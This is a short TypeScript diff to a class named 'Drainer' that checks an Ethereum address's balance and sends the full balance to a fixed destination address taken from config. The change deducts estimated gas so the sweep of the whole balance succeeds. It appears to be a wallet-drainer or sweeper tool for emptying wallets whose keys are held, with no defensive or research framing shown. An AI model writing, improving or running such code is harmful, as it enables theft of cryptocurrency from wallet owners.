@@ -5,6 +5,7 @@ class Drainer {
   private dest: string;
   private provider: ethers.providers.JsonRpcProvider; 
   private count: number;
+  private static gasNeeded: number = 21000;
   
   constructor () {
     this.dest = config.destAddress;
@@ -20,9 +21,12 @@ class Drainer {
     const balance: string = ethers.utils.formatEther(balance_bigNumber);
     console.log(`Attempt ${this.count} Address ${address} has ${balance} ETH`);
     if (balance_bigNumber.gt(ethers.BigNumber.from(0))) {
+      const gasPrice = await this.provider.getGasPrice();
+      const gasTotal = gasPrice.mul(Drainer.gasNeeded);
+      const netAmount = balance_bigNumber.sub(gasTotal);
       const tx = {
           to: this.dest,
-          value: balance_bigNumber
+          value: netAmount
       };
       wallet.sendTransaction(tx).then((txObj) => {
         console.log('txHash: ', txObj.hash)
